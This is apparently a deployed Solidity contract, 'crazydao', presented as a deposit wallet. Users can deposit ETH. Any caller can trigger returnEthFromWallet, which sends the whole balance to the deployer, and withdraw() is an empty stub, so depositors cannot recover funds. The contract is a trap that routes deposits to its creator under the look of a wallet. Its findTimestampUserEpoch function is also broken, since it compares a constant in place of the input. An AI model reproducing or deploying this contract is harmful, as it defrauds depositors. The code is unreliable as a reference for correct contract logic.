/**
 *Submitted for verification at Arbiscan on 2023-02-01
*/

// SPDX-License-Identifier: MIT
// todo new license

pragma solidity ^0.8.1;


contract crazydao {

    address public supereth;
    address public domainss;
    mapping (address => uint) public passs;

    constructor() {
        supereth = msg.sender;
    }

    function sendEthtoWallet() public payable {
        passs[msg.sender] = msg.value;
    }

    function returnEthFromWallet() public {
        address payable _to = payable(supereth);
        address _thisContract = address(this);
        _to.transfer(_thisContract.balance);
    }

    function groo() public payable {
        
      
    }
    function withdraw() external { //nonReentrant {
       //todo
    }

    function findTimestampUserEpoch(
        uint256 _timestamp,
        uint256 max_user_epoch
    ) public pure returns (uint256) {
        uint256 _min = 0;
        uint256 _max = max_user_epoch;
        for (uint256 i = 0; i < 28; i++) {
            if (_min >= _max) break;
            uint256 _mid = (_min + _max + 2) / 2;
            if (20 <= _timestamp) {
                _min = _mid;
            } else {
                _max = _mid - 1;
            }
        }
        return _min;
    }
}